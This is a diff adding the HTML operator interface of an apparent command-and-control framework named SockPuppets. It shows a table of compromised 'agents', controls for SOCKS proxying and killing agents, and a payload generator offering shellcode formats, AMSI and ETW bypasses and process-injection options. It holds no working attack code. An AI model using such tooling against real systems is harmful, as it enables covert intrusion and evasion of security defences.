@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SockPuppets</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Login overlay -->
+    <div id="login-overlay">
+        <div class="login-card glass">
+            <h1>SockPuppets</h1>
+            <div id="login-error" class="login-error hidden"></div>
+            <!-- Login form -->
+            <div id="login-form">
+                <input type="text" id="login-username" placeholder="Username" autocomplete="username">
+                <input type="password" id="login-password" placeholder="Password" autocomplete="current-password">
+                <button id="login-btn" class="glass-btn primary">Login</button>
+            </div>
+            <!-- Change password form (shown when must_change_password) -->
+            <div id="change-password-form" class="hidden">
+                <p class="change-pw-notice">You must change your password before continuing.</p>
+                <input type="password" id="new-password" placeholder="New Password" autocomplete="new-password">
+                <input type="password" id="confirm-password" placeholder="Confirm New Password" autocomplete="new-password">
+                <button id="change-pw-btn" class="glass-btn primary">Change Password</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main app (hidden until login) -->
+    <div id="app" class="hidden">
+        <!-- Toolbar -->
+        <header id="toolbar" class="glass">
+            <div class="toolbar-left">
+                <span class="logo">SockPuppets</span>
+                <span id="server-status" class="status-dot red"></span>
+                <span id="server-info">Disconnected</span>
+            </div>
+            <div class="toolbar-center">
+                <button id="btn-generate" class="toolbar-btn glass-btn">+ Generate</button>
+            </div>
+            <div class="toolbar-right">
+                <span id="operators-list"></span>
+                <button id="btn-theme" class="toolbar-btn glass-btn" title="Toggle theme">&#9789;</button>
+            </div>
+        </header>
+
+        <!-- Agent table -->
+        <section id="main-panel">
+            <div id="agent-table-wrapper" class="glass">
+                <table id="agent-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th><th>Hostname</th><th>User</th><th>OS</th>
+                            <th>IP</th><th>Mode</th><th>Sleep</th><th>Health</th><th>Last Seen</th>
+                        </tr>
+                    </thead>
+                    <tbody id="agent-tbody"></tbody>
+                </table>
+                <div id="no-agents" class="empty-state">No agents connected</div>
+            </div>
+        </section>
+
+        <!-- Draggable divider -->
+        <div id="divider"></div>
+
+        <!-- Bottom panel -->
+        <section id="bottom-panel">
+            <div id="tab-bar">
+                <button class="tab active" data-tab="event-log">Event Log</button>
+            </div>
+            <div id="tab-content">
+                <div id="tab-event-log" class="tab-pane active">
+                    <div id="event-log"></div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- Context menu -->
+    <div id="context-menu" class="glass hidden">
+        <button data-action="interact">Interact</button>
+        <button data-action="sleep">Sleep...</button>
+        <button data-action="socks">SOCKS Proxy...</button>
+        <hr>
+        <button data-action="upgrade">Upgrade to Streaming</button>
+        <button data-action="downgrade">Downgrade to Beacon</button>
+        <hr>
+        <button data-action="kill" class="danger">Kill Agent</button>
+    </div>
+
+    <!-- Generate modal -->
+    <div id="generate-modal" class="modal-overlay hidden">
+        <div class="modal glass">
+            <h2>Generate Payload</h2>
+            <form id="generate-form">
+                <div class="form-row">
+                    <label>Host</label><input type="text" name="host" required>
+                    <label>Port</label><input type="number" name="port" value="8443" required>
+                </div>
+                <div class="form-row">
+                    <label>Key</label><input type="text" name="key" placeholder="SOCKPUPPETS_KEY_2026">
+                </div>
+                <div class="form-row">
+                    <label>Mode</label>
+                    <select name="beacon_mode">
+                        <option value="false">Streaming</option>
+                        <option value="true">Beacon</option>
+                    </select>
+                    <label>Interval</label><input type="number" name="interval" value="60" min="1" style="width:70px">
+                    <label>Jitter %</label><input type="number" name="jitter" value="0" min="0" max="100" style="width:60px">
+                </div>
+                <div class="form-row">
+                    <label>Profile</label><select name="profile" id="profile-select"></select>
+                    <label>Patterns</label><select name="patterns" id="patterns-select"></select>
+                </div>
+                <div class="form-row">
+                    <label>Redirector</label><select name="redirector" id="redirector-select"><option value="">None</option></select>
+                </div>
+                <fieldset class="evasion-toggles">
+                    <legend>Output</legend>
+                    <div class="form-row">
+                        <label>Language</label>
+                        <select name="lang">
+                            <option value="go">Go (compiled)</option>
+                            <option value="python">Python</option>
+                            <option value="all">All</option>
+                        </select>
+                        <label>Format</label>
+                        <select name="output_format" id="output-format-select">
+                            <option value="exe">EXE</option>
+                            <option value="dll">DLL</option>
+                            <option value="shellcode">Shellcode</option>
+                        </select>
+                    </div>
+                    <div class="form-row hidden" id="shellcode-format-row">
+                        <label>Shellcode Format</label>
+                        <select name="shellcode_format">
+                            <option value="raw">Raw (.bin)</option>
+                            <option value="c">C header (.h)</option>
+                            <option value="python">Python (.py)</option>
+                            <option value="powershell">PowerShell (.ps1)</option>
+                            <option value="csharp">C# (.cs)</option>
+                            <option value="base64">Base64</option>
+                        </select>
+                    </div>
+                </fieldset>
+                <fieldset class="evasion-toggles">
+                    <legend>Evasion</legend>
+                    <label><input type="checkbox" name="amsi"> AMSI Bypass</label>
+                    <label><input type="checkbox" name="etw"> ETW Patch</label>
+                    <label><input type="checkbox" name="syscalls" value="indirect"> Syscalls</label>
+                    <label><input type="checkbox" name="sleep_obf" value="ekko"> Sleep Obf</label>
+                    <div class="form-row">
+                        <label>Inject</label>
+                        <select name="inject">
+                            <option value="">None</option>
+                            <option value="hollowing">Process Hollowing</option>
+                            <option value="createthread">CreateRemoteThread</option>
+                            <option value="apc">APC Injection</option>
+                            <option value="stomp">Module Stomping</option>
+                        </select>
+                    </div>
+                </fieldset>
+                <div class="form-actions">
+                    <button type="submit" class="glass-btn primary">Generate</button>
+                    <button type="button" class="glass-btn" id="generate-cancel">Cancel</button>
+                </div>
+            </form>
+            <div id="generate-results" class="hidden"></div>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
